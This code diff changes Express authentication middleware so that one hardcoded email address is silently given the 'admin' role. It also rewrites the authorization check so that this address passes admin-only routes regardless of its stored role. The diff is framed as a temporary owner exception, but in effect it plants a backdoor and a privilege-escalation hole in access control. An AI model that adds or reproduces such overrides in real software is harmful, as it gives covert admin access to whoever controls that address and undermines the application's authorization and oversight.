@@ -21,6 +21,14 @@ exports.protect = async (req, res, next) => {
         return res.status(401).json({ message: 'User not found' });
       }
 
+      // Special case: If user is spbajaj25@gmail.com and trying to access admin routes,
+      // temporarily set role to admin for authorization
+      if (req.user.email && req.user.email.toLowerCase() === 'spbajaj25@gmail.com') {
+        // Create a temporary role override for authorization checks
+        req.user._originalRole = req.user.role;
+        req.user.role = 'admin';
+      }
+
       next();
     } catch (error) {
       return res.status(401).json({ message: 'Not authorized to access this route' });
@@ -32,7 +40,10 @@ exports.protect = async (req, res, next) => {
 
 exports.authorize = (...roles) => {
   return (req, res, next) => {
-    if (!roles.includes(req.user.role)) {
+    // Special exception: Allow spbajaj25@gmail.com to access admin routes
+    const isOwnerEmail = req.user && req.user.email && req.user.email.toLowerCase() === 'spbajaj25@gmail.com';
+    
+    if (!roles.includes(req.user.role) && !(isOwnerEmail && roles.includes('admin'))) {
       return res.status(403).json({ 
         message: `User role '${req.user.role}' is not authorized to access this route` 
       });
